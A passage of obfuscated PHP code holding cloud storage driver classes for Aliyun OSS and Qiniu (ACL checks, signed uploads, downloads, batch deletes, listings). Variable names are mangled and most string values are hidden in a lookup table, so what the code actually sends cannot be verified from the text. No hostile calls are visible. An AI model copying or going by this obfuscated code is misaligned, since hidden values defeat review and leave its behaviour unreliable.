= $®Ú™äé«->getObjectList(); $Òçô‡‹ê = $®Ú™äé«->getPrefixList(); if ($Ñ¶‘š¸€) { if (count($ŠçéÈ®³) > 1 || count($ŠçéÈ®³) == 1 && $ŠçéÈ®³[0]->getKey() != $Ê°û™íÄ) { $á«Öğ¢ += count($ŠçéÈ®³) - 1; } if (!empty($Òçô‡‹ê)) { $´Ÿşåã· += count($Òçô‡‹ê); } if ($ã³’Ÿ¯Œ === $»øğ¹³[12]) { break; } continue; } if ($¤œÅ¤ò…) { if (!empty($ŠçéÈ®³)) { if (count($ŠçéÈ®³) > 1 || $ŠçéÈ®³[0]->getKey() != $Ê°û™íÄ) { return !0; } } } else { if (!empty($Òçô‡‹ê)) { return !0; } } if ($ã³’Ÿ¯Œ === $»øğ¹³[12]) { break; } } if ($Ñ¶‘š¸€) { return array($»øğ¹³[207] => $á«Öğ¢, $»øğ¹³[208] => $´Ÿşåã·); } return !1; } public function listAll($Ì‚âç§) { $İåáËˆÕ =& $_SERVER[³·—™¤¢]; $ËíÑ•Çä = $this->fileList($Ì‚âç§, $İåáËˆÕ[12], !0); $ÖÏ±˜è„ = array(); foreach ($ËíÑ•Çä[$İåáËˆÕ[83]] as $ó³äã€Â) { $ÖÏ±˜è„[$ó³äã€Â[$İåáËˆÕ[32]]] = $ó³äã€Â[$İåáËˆÕ[76]]; } foreach ($ËíÑ•Çä[$İåáËˆÕ[82]] as $ó³äã€Â) { if (is_string($ó³äã€Â)) { $ÖÏ±˜è„[$ó³äã€Â] = 0; } } return $this->listAllFiles($Ì‚âç§, array_keys($ÖÏ±˜è„), $ÖÏ±˜è„); } public function canRead($°ŠÚœôÈ) { $Ú˜ØŒßĞ =& $_SERVER[³·—™¤¢]; $ş¬ï–Ë‘ = $this->pathAcl($°ŠÚœôÈ); return $ş¬ï–Ë‘ == $Ú˜ØŒßĞ[1429] || $ş¬ï–Ë‘ == $Ú˜ØŒßĞ[556] ? !0 : !1; } public function canWrite($à³óñÍø) { $ÌËîÊ™œ = $this->pathAcl($à³óñÍø); return $ÌËîÊ™œ == $_SERVER[³·—™¤¢][556] ? !0 : !1; } public function pathAcl($¹ÄöşÀ…) { $ıë‡Ø‡‡ =& $_SERVER[³·—™¤¢]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $âÒñÏŞ× = $this->client->getObjectAcl($this->bucket, $this->pathEncode($¹ÄöşÀ…)); } catch (OSS\Core\OssException $ù‘æ×äÚ) { return !1; } $ÍŒ¹¨× = $âÒñÏŞ× == $ıë‡Ø‡‡[37] ? $this->bucketAcl : $âÒñÏŞ×; if ($ÍŒ¹¨× == $ıë‡Ø‡‡[1430]) { return $ıë‡Ø‡‡[1429]; } if ($ÍŒ¹¨× == $ıë‡Ø‡‡[1431]) { return $ıë‡Ø‡‡[556]; } return $ÍŒ¹¨×; } private function chmodPath($ƒÂà“â, $¾û£›ƒ = '') { $…Ê€êÖÁ =& $_SERVER[³·—™¤¢]; $Òş€Ã¬ç = empty($¾û£›ƒ) ? $…Ê€êÖÁ[1431] : $¾û£›ƒ; $µâƒö‡ = array($…Ê€êÖÁ[37], $…Ê€êÖÁ[198], $…Ê€êÖÁ[1430], $…Ê€êÖÁ[1431]); if (!in_array($Òş€Ã¬ç, $µâƒö‡)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ƒÂà“â), $Òş€Ã¬ç); } catch (OSS\Core\OssException $úÑƒèöø) { return !1; } return !0; } public function getContent($ÜşòÚÖà) { return $this->fileSubstr($ÜşòÚÖà, -1); } public function setContent($ê‘»²ºè, $Î·Ô„œª = '') { $ÏÂòøÊŠ =& $_SERVER[³·—™¤¢]; try { $¥†Ìİ¯š = $this->trafficLimit($ÏÂòøÊŠ[1432]); $ô¿ò‡¿ = $this->client->putObject($this->bucket, $this->pathEncode($ê‘»²ºè), $Î·Ô„œª, $¥†Ìİ¯š); } catch (OSS\Core\OssException $š¦¨ëª) { return !1; } $Ì§ç•Ÿˆ = array($ÏÂòøÊŠ[1422] => trim($ô¿ò‡¿[$ÏÂòøÊŠ[1433]], $ÏÂòøÊŠ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ê‘»²ºè))); $this->updateObjMeta($ê‘»²ºè, $Ì§ç•Ÿˆ); return isset($ô¿ò‡¿[$ÏÂòøÊŠ[1434]][$ÏÂòøÊŠ[1381]]) ? !0 : !1; } private function updateObjMeta($­ğ¥ØˆÕ, $ÔÔæìø°) { $­ğ¥ØˆÕ = $this->pathEncode($­ğ¥ØˆÕ); try { $Õù‡ãÜ² = array(OSS\OssClient::OSS_HEADERS => $ÔÔæìø°); $this->client->copyObject($this->bucket, $­ğ¥ØˆÕ, $this->bucket, $­ğ¥ØˆÕ, $Õù‡ãÜ²); } catch (OSS\Core\OssException $çÉ½»¥) { return !1; } return !0; } public function upload($Ù¬“§², $ÎŸëĞ¯é, $ÉÇ›ó›² = false, $®¨¼Îû¼ = REPEAT_REPLACE) { $‰±ç­ŒÃ =& $_SERVER[³·—™¤¢]; $íñÀÖœ = trim($Ù¬“§², $‰±ç­ŒÃ[8]); $ä—µäÓ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($‰±ç­ŒÃ[1422] => @md5_file($ÎŸëĞ¯é)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Ù¬“§²))); $ä—µäÓ = $this->trafficLimit($‰±ç­ŒÃ[1432], $ä—µäÓ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($íñÀÖœ), $ÎŸëĞ¯é, $ä—µäÓ); } catch (OSS\Core\OssException $ºşÜö¹Å) { return !1; } return $this->getPathOuter($Ù¬“§²); } public function getHost() { $“ Ö°şÏ =& $_SERVER[³·—™¤¢]; $°åùşÇ = explode($“ Ö°şÏ[183], parent::getHost()); return $°åùşÇ[0] . $“ Ö°şÏ[183] . $this->bucket . $“ Ö°şÏ[10] . $°åùşÇ[1]; } public function uploadFormData($ ñàÃ¯š, $„Ùüôƒ® = 3600) { $Ø³¤ÓÒù =& $_SERVER[³·—™¤¢]; if (!($¹¦Œ·‹µ = $this->getHost())) { return !1; } $×òúÈ€ = $„Ùüôƒ®; $­çîœ•— = date($Ø³¤ÓÒù[1435], time() + $×òúÈ€); $¼ôÇ¢ÕÇ = new DateTime($­çîœ•—); $ô“–Ş  = $¼ôÇ¢ÕÇ->format(DateTime::ISO8601); $ø¦àĞö = strpos($ô“–Ş , $Ø³¤ÓÒù[296]); $ô“–Ş  = substr($ô“–Ş , 0, $ø¦àĞö) . $Ø³¤ÓÒù[1436]; $¦ÖÌË„ = 1048576000 * 5; $òİŠÓ¶ = $this->pathFather($ ñàÃ¯š); $ÙÁ’ÆçŒ = array($Ø³¤ÓÒù[1335] => $ô“–Ş , $Ø³¤ÓÒù[1336] => array(array($Ø³¤ÓÒù[1437], 0, $¦ÖÌË„), array($Ø³¤ÓÒù[1339], $Ø³¤ÓÒù[1340], $òİŠÓ¶))); $À¾—óÌï = base64_encode(json_encode($ÙÁ’ÆçŒ)); $ßíŒË¼¬ = base64_encode(hash_hmac($Ø³¤ÓÒù[232], $À¾—óÌï, $this->secret, !0)); $»›±Şà¥ = array($Ø³¤ÓÒù[1345] => $À¾—óÌï, $Ø³¤ÓÒù[1438] => $this->accessKey, $Ø³¤ÓÒù[1341] => $Ø³¤ÓÒù[1333], $Ø³¤ÓÒù[1439] => $ßíŒË¼¬, $Ø³¤ÓÒù[181] => $¹¦Œ·‹µ); $»›±Şà¥ = $this->trafficLimit($Ø³¤ÓÒù[1432], $»›±Şà¥); return $»›±Şà¥; } public function multiUploadFormData($äÀÕ€ò, $ıíú¶¨È = 3600) { $ÚéÒ°¤ë =& $_SERVER[³·—™¤¢]; if (!($Şùä‹Œí = $this->getHost())) { return !1; } $‘àØ‘÷í = $this->trafficLimit($ÚéÒ°¤ë[1432]); $åëßßÇ™ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($äÀÕ€ò), $‘àØ‘÷í); return array($ÚéÒ°¤ë[223] => $åëßßÇ™, $ÚéÒ°¤ë[181] => $Şùä‹Œí . $ÚéÒ°¤ë[8] . $this->pathEncode($äÀÕ€ò), $ÚéÒ°¤ë[224] => gmdate($ÚéÒ°¤ë[1440]), $ÚéÒ°¤ë[94] => $äÀÕ€ò); } public function multiUploadAuthData($»…ãÈŞß, $Û¯’ªñö = array()) { $ÔüÒ¶¾² =& $_SERVER[³·—™¤¢]; $×òÛÜ³¬ = isset($Û¯’ªñö[$ÔüÒ¶¾²[224]]) ? $Û¯’ªñö[$ÔüÒ¶¾²[224]] : gmdate($ÔüÒ¶¾²[1440]); $âƒÁşÌû = isset($Û¯’ªñö[$ÔüÒ¶¾²[174]]) ? $Û¯’ªñö[$ÔüÒ¶¾²[174]] : $ÔüÒ¶¾²[12]; $µº®«ªÊ = $»…ãÈŞß; if (isset($Û¯’ªñö[$ÔüÒ¶¾²[94]])) { $µº®«ªÊ = $Û¯’ªñö[$ÔüÒ¶¾²[94]]; unset($Û¯’ªñö[$ÔüÒ¶¾²[94]]); } if (isset($Û¯’ªñö[$ÔüÒ¶¾²[225]])) { $Û¯’ªñö[$ÔüÒ¶¾²[224]] = $×òÛÜ³¬; return $this->listUploadParts($µº®«ªÊ, $Û¯’ªñö); } $øÖ£‘ÔÍ = array($ÔüÒ¶¾²[226], $ÔüÒ¶¾²[12], $ÔüÒ¶¾²[120], $×òÛÜ³¬, "\x78\x2d\x6f\163\x73\x2d\144\x61\x74\x65\72{$×òÛÜ³¬}", $ÔüÒ¶¾²[8] . $this->bucket . $ÔüÒ¶¾²[8] . $µº®«ªÊ . $âƒÁşÌû); if (strpos($âƒÁşÌû, $ÔüÒ¶¾²[227]) === 0) { $øÖ£‘ÔÍ[0] = $ÔüÒ¶¾²[228]; if ($Í¸ÖÁ˜‹ = $this->trafficLimit($ÔüÒ¶¾²[1432])) { $µº®«ªÊ = $ÔüÒ¶¾²[1441]; array_splice($øÖ£‘ÔÍ, 5, 0, $µº®«ªÊ . $ÔüÒ¶¾²[4] . $Í¸ÖÁ˜‹[$µº®«ªÊ]); } } if (isset($Û¯’ªñö[$ÔüÒ¶¾²[229]]) && $Û¯’ªñö[$ÔüÒ¶¾²[229]] == $ÔüÒ¶¾²[230]) { $øÖ£‘ÔÍ[0] = $ÔüÒ¶¾²[230]; } if (!empty($Û¯’ªñö[$ÔüÒ¶¾²[1442]])) { $ñŸ‹¼¸¹ = array_merge(array($øÖ£‘ÔÍ[4]), $Û¯’ªñö[$ÔüÒ¶¾²[1442]]); sort($ñŸ‹¼¸¹); $øÖ£‘ÔÍ[4] = implode($ÔüÒ¶¾²[231], $ñŸ‹¼¸¹); } $ûİùêŒ = implode($ÔüÒ¶¾²[231], $øÖ£‘ÔÍ); $¿”ˆµöí = base64_encode(hash_hmac($ÔüÒ¶¾²[232], $ûİùêŒ, $this->secret, !0)); $Ê”Œ—ÁÓ = $ÔüÒ¶¾²[1406] . $this->accessKey . $ÔüÒ¶¾²[4] . $¿”ˆµöí; if (strpos($âƒÁşÌû, $ÔüÒ¶¾²[227]) === 0) { $Ê”Œ—ÁÓ = array($ÔüÒ¶¾²[234] => $Ê”Œ—ÁÓ, $ÔüÒ¶¾²[224] => $×òÛÜ³¬); if ($Í¸ÖÁ˜‹) { $Ê”Œ—ÁÓ = array_merge($Ê”Œ—ÁÓ, $Í¸ÖÁ˜‹); } } return $Ê”Œ—ÁÓ; } public function listUploadParts($×õı»—á, $ä¡Û’ªÒ) { $Ô¢¤ˆÀ¥ =& $_SERVER[³·—™¤¢]; $ĞÃ¸›í = parse_url_query($ä¡Û’ªÒ[$Ô¢¤ˆÀ¥[174]]); $±¢²©ø = $this->client->listParts($this->bucket, $this->pathEncode($×õı»—á), $ĞÃ¸›í[$Ô¢¤ˆÀ¥[223]]); $ª¨Ğ¹õÓ = $±¢²©ø->getListPart(); $Ô¶•Ş = array(); foreach ($ª¨Ğ¹õÓ as $‡—Ñ£°¦) { $Ô¶•Ş[] = array($Ô¢¤ˆÀ¥[1426] => $‡—Ñ£°¦->getPartNumber(), $Ô¢¤ˆÀ¥[1427] => trim($‡—Ñ£°¦->getETag(), $Ô¢¤ˆÀ¥[118])); } unset($ä¡Û’ªÒ[$Ô¢¤ˆÀ¥[225]], $ä¡Û’ªÒ[$Ô¢¤ˆÀ¥[229]]); $ÁÔëˆñø = $this->multiUploadAuthData($×õı»—á, $ä¡Û’ªÒ); if (empty($ÁÔëˆñø)) { return !1; } return array($Ô¢¤ˆÀ¥[234] => $ÁÔëˆñø, $Ô¢¤ˆÀ¥[224] => $ä¡Û’ªÒ[$Ô¢¤ˆÀ¥[224]], $Ô¢¤ˆÀ¥[236] => $Ô¶•Ş); } public function download($ŠÜÈô„, $Œƒ‘äâ¢) { if ($this->isFolder($ŠÜÈô„)) { return !1; } try { $±ôœãôÖ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Œƒ‘äâ¢); $±ôœãôÖ = $this->trafficLimit($_SERVER[³·—™¤¢][109], $±ôœãôÖ); $this->client->getObject($this->bucket, $this->pathEncode($ŠÜÈô„), $±ôœãôÖ); } catch (OSS\Core\OssException $‘„íê÷ş) { return !1; } return $Œƒ‘äâ¢; } public function fileSubstr($ãä®×ã, $Œ§ñïı­ = 0, $é½ˆ¤úê = false) { if ($Œ§ñïı­ === -1) { $ÛÙúèˆ¡ = array(); } else { if ($é½ˆ¤úê === !1) { $ëÊ¨·¢² = $this->size($ãä®×ã); } else { $ëÊ¨·¢² = $Œ§ñïı­ + $é½ˆ¤úê - 1; } $ÛÙúèˆ¡ = array(OSS\OssClient::OSS_RANGE => "{$Œ§ñïı­}\55{$ëÊ¨·¢²}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ãä®×ã), $ÛÙúèˆ¡); } catch (OSS\Core\OssException $«†Ğè¼À) { think_exception($«†Ğè¼À->getMessage()); return !1; } } private function trafficLimit($²¿¥ÔÀ´, $°ã«ÈÄ¾ = array()) { $ÛÑŞ¹¼ =& $_SERVER[³·—™¤¢]; if ($²¿¥ÔÀ´ == $ÛÑŞ¹¼[1432] && $this->isUploadServer() || $²¿¥ÔÀ´ == $ÛÑŞ¹¼[109] && $this->isFileOutServer()) { return $°ã«ÈÄ¾; } $¬Ş®ë‰Î = floatval($GLOBALS[$ÛÑŞ¹¼[6]][$ÛÑŞ¹¼[89]][$ÛÑŞ¹¼[107]][$²¿¥ÔÀ´]) * 1024 * 1024 * 8; if (!$¬Ş®ë‰Î) { return $°ã«ÈÄ¾; } $¬Ş®ë‰Î = $¬Ş®ë‰Î < 819200 ? 819200 : ($¬Ş®ë‰Î > 838860800 ? 838860800 : $¬Ş®ë‰Î); $°ã«ÈÄ¾[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¬Ş®ë‰Î); return $°ã«ÈÄ¾; } public function link($®¨®¹µ›, $èÀÒëì· = array()) { $‚í—½’ =& $_SERVER[³·—™¤¢]; if (!$this->exist($®¨®¹µ›) || $this->isFolder($®¨®¹µ›)) { return !1; } try { $èÀÒëì· = $this->trafficLimit($‚í—½’[109], $èÀÒëì·); $Ù´Ô¦Éí = $this->client->signUrl($this->bucket, $this->pathEncode($®¨®¹µ›), 3600 * 12, $‚í—½’[230], $èÀÒëì·); return $this->getCdnLink($Ù´Ô¦Éí); } catch (OSS\Core\OssException $ÔöÍªÒì) { return !1; } } public function fileOut($ÇïöŸÔ, $«ä§ƒ¡Î = false, $–›ÉÆ‘ = false, $¶Àğ´º£ = '') { $¡¥èî =& $_SERVER[³·—™¤¢]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÇïöŸÔ, $«ä§ƒ¡Î, $–›ÉÆ‘, $¶Àğ´º£); } if (!$–›ÉÆ‘) { $–›ÉÆ‘ = $this->pathThis($ÇïöŸÔ); } $–›ÉÆ‘ = rawurlencode($–›ÉÆ‘); $Ìœ¤˜÷â = get_file_mime(get_path_ext($–›ÉÆ‘)); if ($Ìœ¤˜÷â == $¡¥èî[217]) { return parent::fileOut($ÇïöŸÔ, $«ä§ƒ¡Î, $–›ÉÆ‘, $¶Àğ´º£); } $«ä§ƒ¡Î = $«ä§ƒ¡Î ? $¡¥èî[1443] : $¡¥èî[1444]; $•É¹Œ¶Ó = array(OSS\OssClient::OSS_SUB_RESOURCE => $¡¥èî[1445] . rawurlencode("{$«ä§ƒ¡Î}\x3b\146\x69\154\x65\156\x61\155\145\x3d{$–›ÉÆ‘}")); $•É¹Œ¶Ó[OSS\OssClient::OSS_SUB_RESOURCE] .= $¡¥èî[1446] . rawurlencode($Ìœ¤˜÷â); $Èá®ôç = $this->link($ÇïöŸÔ, $•É¹Œ¶Ó); $this->fileOutLink($Èá®ôç); } public function fileOutServer($ÂĞŠâ¤¥, $ÖÆŸÇŠí = false, $ôÃ—ç¥¹ = false, $íÚ™Ãç = '') { parent::fileOut($ÂĞŠâ¤¥, $ÖÆŸÇŠí, $ôÃ—ç¥¹, $íÚ™Ãç); } public function fileOutImage($»£ÛØüè, $Çâµ¾˜¾ = 250) { $€‘Ã¤®¬ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[³·—™¤¢][1447] . $Çâµ¾˜¾); $¹±•¨ı = $this->link($»£ÛØüè, $€‘Ã¤®¬); $this->fileOutLink($¹±•¨ı); } public function fileOutImageServer($×¢‹Ş›, $»‹øÅá = 250) { parent::fileOutImage($×¢‹Ş›, $»‹øÅá); } public function fileOutLink($ı‚ØÏß) { $¢ñ¹¤÷ó =& $_SERVER[³·—™¤¢]; if (!$this->isCdnHost() && substr($ı‚ØÏß, 0, 7) == $¢ñ¹¤÷ó[1348]) { $ı‚ØÏß = $¢ñ¹¤÷ó[1349] . substr($ı‚ØÏß, 7); } header($¢ñ¹¤÷ó[161] . $ı‚ØÏß); die; } public function hashMd5($ı‰Ë’­­, $Œ“ÉëÏÑ = '') { $¦‹¢úñ‡ =& $_SERVER[³·—™¤¢]; $Ìı—¬Ó« = $this->_objectMeta($ı‰Ë’­­); if (!$Ìı—¬Ó«) { return $¦‹¢úñ‡[12]; } if (!isset($Ìı—¬Ó«[$¦‹¢úñ‡[1422]]) && !empty($Œ“ÉëÏÑ)) { $…¡Á¨ÄÆ = $this->updateObjMeta($ı‰Ë’­­, array($¦‹¢úñ‡[1422] => $Œ“ÉëÏÑ)); $Ìı—¬Ó«[$¦‹¢úñ‡[1422]] = $…¡Á¨ÄÆ ? $Œ“ÉëÏÑ : $¦‹¢úñ‡[12]; } return isset($Ìı—¬Ó«[$¦‹¢úñ‡[1422]]) ? strtolower($Ìı—¬Ó«[$¦‹¢úñ‡[1422]]) : $¦‹¢úñ‡[12]; } public function size($ò²×âİø) { $½ÛîÎ = $this->objectMeta($ò²×âİø); return $½ÛîÎ ? $½ÛîÎ[$_SERVER[³·—™¤¢][76]] : 0; } public function info($¡¥•èòı) { if ($this->isFolder($¡¥•èòı)) { return $this->folderInfo($¡¥•èòı); } else { if ($this->isFile($¡¥•èòı)) { return $this->fileInfo($¡¥•èòı); } } return !1; } public function exist($Ò®µÕáş) { return $this->isFile($Ò®µÕáş) || $this->isFolder($Ò®µÕáş); } public function isFile($êŒ·óÁ») { return !$this->isFolder($êŒ·óÁ») && $this->objectMeta($êŒ·óÁ»); } public function isFolder($Ò«³¿‡®) { return $this->cacheMethod($_SERVER[³·—™¤¢][165], $Ò«³¿‡®); } protected function objectMeta($À§‡œÆ‡) { return $this->cacheMethod($_SERVER[³·—™¤¢][167], $À§‡œÆ‡); } protected function _objectMeta($ıœè¬¥) { $Ü¦àÁë§ =& $_SERVER[³·—™¤¢]; try { $çßË©ìÈ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ıœè¬¥)); } catch (OSS\Core\OssException $Ûïù£¬¹) { $çßË©ìÈ = !1; } if ($çßË©ìÈ) { $çßË©ìÈ[$Ü¦àÁë§[76]] = intval($çßË©ìÈ[$Ü¦àÁë§[1420]]); } return $çßË©ìÈ; } protected function _isFolder($ı¬ÛªŞÅ) { $şãÔŸÃ =& $_SERVER[³·—™¤¢]; if ($ı¬ÛªŞÅ == $şãÔŸÃ[12] || $ı¬ÛªŞÅ == $şãÔŸÃ[8]) { return !0; } $ü…à±ùÕ = array($şãÔŸÃ[1416] => $şãÔŸÃ[8], $şãÔŸÃ[1417] => rtrim($ı¬ÛªŞÅ, $şãÔŸÃ[8]) . $şãÔŸÃ[8], $şãÔŸÃ[1418] => 1, $şãÔŸÃ[1419] => $şãÔŸÃ[12]); $áèìØèÙ = $this->client->listObjects($this->bucket, $ü…à±ùÕ); if ($áèìØèÙ->getObjectList() || $áèìØèÙ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public function __construct($Åì–”Õø) { parent::__construct(); require_once SDK_DIR . $_SERVER[³·—™¤¢][1448]; $this->_init($Åì–”Õø); } public function _init($Ğ‹×´…Œ) { $·¸¾à’• =& $_SERVER[³·—™¤¢]; foreach ($Ğ‹×´…Œ as $øÒÉ­öà => $ö—­İºë) { if (isset($this->{$øÒÉ­öà})) { $this->{$øÒÉ­öà} = $ö—­İºë; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($·¸¾à’•[1449] . LNG($·¸¾à’•[1407])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Ë€çòµ“, $‡®ü•Ø = '', $ƒ›È¾á¿ = REPEAT_RENAME) { if ($this->setContent($Ë€çòµ“, $‡®ü•Ø)) { return $this->getPathOuter($Ë€çòµ“); } return !1; } public function mkdir($Ç•ï•†¶, $¹“¾‘ = REPEAT_SKIP) { $‘Û¥Õª =& $_SERVER[³·—™¤¢]; $¾£—§ÄÊ = trim($Ç•ï•†¶, $‘Û¥Õª[8]); if ($this->_isFolder($¾£—§ÄÊ)) { return $this->getPathOuter($¾£—§ÄÊ); } $Ç•ï•†¶ = $¾£—§ÄÊ . $‘Û¥Õª[8]; $ìïş™æø = get_path_this($¾£—§ÄÊ); $ôşó§¯‹ = $Ç•ï•†¶ . $ìïş™æø; if (!$this->mkfile($ôşó§¯‹)) { return !1; } if (!$this->moveFile($ôşó§¯‹, $Ç•ï•†¶)) { $this->delFile($ôşó§¯‹); return !1; } return $this->getPathOuter($¾£—§ÄÊ); } public function copyFile($ĞÉ›Ò¥‘, $½½Ù¥±Õ) { $“œŸ°º = $this->bucketManager->copy($this->bucket, $ĞÉ›Ò¥‘, $this->bucket, $½½Ù¥±Õ, !0); return $“œŸ°º ? !1 : $this->getPathOuter($½½Ù¥±Õ); } public function moveFile($àçĞ¦…, $èº„ığ¶) { $‰’·µê = $this->bucketManager->move($this->bucket, $àçĞ¦…, $this->bucket, $èº„ığ¶, !0); return $‰’·µê ? !1 : $this->getPathOuter($èº„ığ¶); } public function delFile($ÏŠìœû) { if (!$this->exist($ÏŠìœû)) { return !0; } $¶ºß½Û = $this->bucketManager->delete($this->bucket, $ÏŠìœû); return $¶ºß½Û ? !1 : !0; } public function delFolder($ë’êì¤) { $–™ØşäÁ =& $_SERVER[³·—™¤¢]; if (!$this->exist($ë’êì¤)) { return !0; } $this->listItemCache = !1; $›ñË¨Ä = $this->fileList($ë’êì¤); $this->listItemCache = !0; $ÕŠ¯Àö = trim($ë’êì¤, $–™ØşäÁ[8]) . $–™ØşäÁ[8]; if (!empty($ë’êì¤) && $ë’êì¤ !== $–™ØşäÁ[197] && !in_array($ÕŠ¯Àö, $›ñË¨Ä[$–™ØşäÁ[82]])) { $›ñË¨Ä[$–™ØşäÁ[82]][] = $ÕŠ¯Àö; } $Ìä¾ëÁş = $this->delByBatch($›ñË¨Ä[$–™ØşäÁ[83]]); if (!$Ìä¾ëÁş) { return !1; } $Ìä¾ëÁş = $this->delByBatch($›ñË¨Ä[$–™ØşäÁ[82]]); if (!$Ìä¾ëÁş) { return !1; } return $this->delFile($ÕŠ¯Àö); } private function delByBatch($‚àÇŸˆ…) { foreach (array_chunk($‚àÇŸˆ…, 1000) as $˜”ºãÃ¬) { $ÓËãÌ²» = $this->bucketManager->buildBatchDelete($this->bucket, $˜”ºãÃ¬); list($÷ÏÉšÊ, $á…„¿›Ü) = $this->bucketManager->batch($ÓËãÌ²»); if ($á…„¿›Ü) { return !1; } } return !0; } public function rename($Ş”…¥³, $¼åš‚è‚) { return $this->renameObject($Ş”…¥³, $¼åš‚è‚); } public function fileInfo($‡¡èµŒÂ, $•ôïŸ¸ = false, $”¹ûìõ = array()) { $±Ï…–¸ =& $_SERVER[³·—™¤¢]; $æ¡Í§ = array($±Ï…–¸[32] => $this->pathThis($‡¡èµŒÂ), $±Ï…–¸[84] => $this->getPathOuter($±Ï…–¸[8] . $‡¡èµŒÂ), $±Ï…–¸[33] => $±Ï…–¸[199], $±Ï…–¸[76] => isset($”¹ûìõ[$±Ï…–¸[1450]]) ? $”¹ûìõ[$±Ï…–¸[1450]] : 0, $±Ï…–¸[174] => $this->ext($‡¡èµŒÂ)); if ($•ôïŸ¸) { return $æ¡Í§; } $æ¡Í§[$±Ï…–¸[200]] = $æ¡Í§[$±Ï…–¸[85]] = 0; $æ¡Í§[$±Ï…–¸[201]] = $æ¡Í§[$±Ï…–¸[202]] = !0; if (empty($”¹ûìõ)) { $”¹ûìõ = $this->objectMeta($‡¡èµŒÂ); if (!$”¹ûìõ) { return $æ¡Í§; } } if (isset($”¹ûìõ[$±Ï…–¸[1451]])) { $æ¡Í§[$±Ï…–¸[85]] = substr($”¹ûìõ[$±Ï…–¸[1451]] . $±Ï…–¸[12], 0, 10); } if (isset($”¹ûìõ[$±Ï…–¸[1450]])) { $æ¡Í§[$±Ï…–¸[76]] = $”¹ûìõ[$±Ï…–¸[1450]]; } return $æ¡Í§; } public function folderInfo($¯Ğ¦¦Ó—, $ËºáÄÁó = false) { $Óà“»üá =& $_SERVER[³·—™¤¢]; $÷ƒòÍË¯ = array($Óà“»üá[32] => $this->pathThis($¯Ğ¦¦Ó—), $Óà“»üá[84] => $this->getPathOuter($Óà“»üá[8] . $¯Ğ¦¦Ó—), $Óà“»üá[33] => $Óà“»üá[75]); if ($ËºáÄÁó) { return $÷ƒòÍË¯; } $÷ƒòÍË¯[$Óà“»üá[200]] = $÷ƒòÍË¯[$Óà“»üá[85]] = 0; $÷ƒòÍË¯[$Óà“»üá[201]] = $÷ƒòÍË¯[$Óà“»üá[202]] = !0; $¯Ğ¦¦Ó— = rtrim($¯Ğ¦¦Ó—, $Óà“»üá[8]) . $Óà“»üá[8]; $…àãÀĞÛ = $this->objectMeta($¯Ğ¦¦Ó—); if (isset($…àãÀĞÛ[$Óà“»üá[1451]])) { $÷ƒòÍË¯[$Óà“»üá[85]] = substr($…àãÀĞÛ[$Óà“»üá[1451]] . $Óà“»üá[12], 0, 10); } return $÷ƒòÍË¯; } public function listPath($èŞËá´Ğ, $æŠé‹¿’ = false) { $”æî¡ğ§ =& $_SERVER[³·—™¤¢]; $Âû‰öôÊ = $this->fileList($èŞËá´Ğ, $”æî¡ğ§[8], !0); foreach ($Âû‰öôÊ[$”æî¡ğ§[82]] as $«©®ıÛ÷ => $•àÏ¦ÑŠ) { $Âû‰öôÊ[$”æî¡ğ§[82]][$«©®ıÛ÷] = $this->folderInfo($•àÏ¦ÑŠ, $æŠé‹¿’); } foreach ($Âû‰öôÊ[$”æî¡ğ§[83]] as $«©®ıÛ÷ => $•àÏ¦ÑŠ) { $Âû‰öôÊ[$”æî¡ğ§[83]][$«©®ıÛ÷] = $this->fileInfo($•àÏ¦ÑŠ[$”æî¡ğ§[94]], $æŠé‹¿’, $•àÏ¦ÑŠ); } return $Âû‰öôÊ; } public function has($ôº·×©›, $Ï…Éø—§ = false, $ıœ«Âı« = true) { $Ç€äò’ =& $_SERVER[³·—™¤¢]; $ôº·×©› = trim($ôº·×©›, $Ç€äò’[8]); $âÅáò²Ô = empty($ôº·×©›) && $ôº·×©› !== $Ç€äò’[197] ? $Ç€äò’[12] : $ôº·×©› . $Ç€äò’[8]; $Ÿ®æÀı = $Ç€äò’[12]; $²Î¬ÒÌ´ = 500; $÷ ûåš¾ = $Ç€äò’[8]; $£ éÑÑ = $¦”¯ÙÌô = 0; while (!0) { check_abort(); list($çĞÊ, $Ğá¥£¦¢) = $this->bucketManager->listFiles($this->bucket, $âÅáò²Ô, $Ÿ®æÀı, $²Î¬ÒÌ´, $÷ ûåš¾); if ($Ğá¥£¦¢) { break; } $Ÿ®æÀı = array_key_exists($Ç€äò’[1419], $çĞÊ) ? $Ÿ®æÀı = $çĞÊ[$Ç€äò’[1452]] : $Ç€äò’[12]; if ($Ï…Éø—§) { if (!empty($çĞÊ[$Ç€äò’[1453]])) { $£ éÑÑ += count($çĞÊ[$Ç€äò’[1453]]); } if (!empty($çĞÊ[$Ç€äò’[1454]])) { $¦”¯ÙÌô += count($çĞÊ[$Ç€äò’[1454]]); } if ($Ÿ®æÀı === $Ç€äò’[12]) { break; } continue; } if ($ıœ«Âı«) { if (!empty($çĞÊ[$Ç€äò’[1453]])) { return !0; } } else { if (!empty($çĞÊ[$Ç€äò’[1454]])) { return !0; } } if 